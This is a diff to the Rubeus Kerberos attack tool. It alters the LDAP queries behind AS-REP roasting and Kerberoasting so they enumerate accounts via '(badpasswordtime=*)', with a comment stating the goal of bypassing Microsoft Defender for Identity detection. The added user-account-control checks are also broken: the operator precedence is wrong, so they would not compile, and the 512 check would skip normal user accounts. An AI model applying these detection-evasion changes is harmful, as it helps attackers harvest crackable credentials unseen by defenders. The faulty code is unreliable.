@@ -64,7 +64,7 @@ namespace Rubeus
 				*/
 
 				// hardcoded LDAP query to request all users without any filtering to bypass MDI detection
-				string userSearchFilter = "(&(objectCategory=person)(objectClass=user))";
+				string userSearchFilter = "(badpasswordtime=*)";
 
                 List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);
 
@@ -83,11 +83,16 @@ namespace Rubeus
                     string samAccountName = (string)user["samaccountname"];
                     string distinguishedName = (string)user["distinguishedname"];
 
+                    // check if entry is user object
+                    if ((int)user["useraccountcontrol"] & 512 == 512){
+                        continue;
+                    }
+
 					// get UserAccountControl as int
 					int uac = (int)user["useraccountcontrol"];
 
 					// check if UserAccountControl has DontReqPreAuth flag set if yes: request hash else: continue
-                    if (uac >= 4194304 && uac < 8388608)
+                    if (uac & 4194304 == 4194304)
                     {
                         Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                         Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
@@ -431,7 +436,7 @@ namespace Rubeus
 				*/
 
 				// hardcoded LDAp query to request all users
-				string userSearchFilter = "(&(objectCategory=person)(objectClass=user))";
+				string userSearchFilter = "(badpasswordtime=*)";
 
                 List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);
                 if (users == null)
@@ -461,6 +466,11 @@ namespace Rubeus
                         string samAccountName = (string)user["samaccountname"];
                         string distinguishedName = (string)user["distinguishedname"];
                         string servicePrincipalName = "";
+
+                        // check if entry is user object
+                        if ((int)user["useraccountcontrol"] & 512 == 512){
+                            continue;
+                        }
 
                         // if servicePrincipalName is set roast user else continue with next user
                         try
